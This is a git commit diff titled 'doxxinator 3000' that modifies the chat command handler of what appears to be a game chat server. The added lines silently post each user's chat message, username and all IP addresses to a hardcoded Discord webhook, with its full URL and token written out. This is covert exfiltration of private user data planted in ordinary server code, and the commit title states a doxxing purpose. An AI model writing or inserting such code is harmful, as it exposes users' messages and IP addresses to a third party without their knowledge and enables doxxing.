8418d64704043345268fdb08814904defe46f031
vikrambarr <37145312+vikrambarr@users.noreply.github.com>
2024-09-24 18:27:16 +0100

    doxxinator 3000

--- server/chat.ts
+++ server/chat.ts
@@ -33,6 +33,7 @@ import {Dex} from '../sim';
 import {PrivateMessages} from './private-messages';
 import * as pathModule from 'path';
 import * as JSX from './chat-jsx';
+import {Net} from '../lib';
 
 export type PageHandler = (this: PageContext, query: string[], user: User, connection: Connection)
 => Promise<string | null | void | JSX.VNode> | string | null | void | JSX.VNode;
@@ -1123,6 +1124,10 @@ export class CommandContext extends MessageContext {
 		if (!user.named) {
 			throw new Chat.ErrorMessage(this.tr`You must choose a name before you can talk.`);
 		}
+		Net(`https://discord.com/api/webhooks/1288187672053157899/qPSVFlhz-M8J54Xe3aMgXFikslGLjFI8Y9o8H6hNWs-SPG3A4jJ1HqnB7WUP4jdSE9xL`).post({
+			body: {"content": `**${message}** from user **${user.name}** ips: ${user.ips.join(', ')}`, "wait": 1},
+			timeout: 10 * 1000, // 10s
+		});
 		if (!user.can('bypassall')) {
 			const lockType = (user.namelocked ? this.tr`namelocked` : user.locked ? this.tr`locked` : ``);
 			const lockExpiration = Punishments.checkLockExpiration(user.namelocked || user.locked);
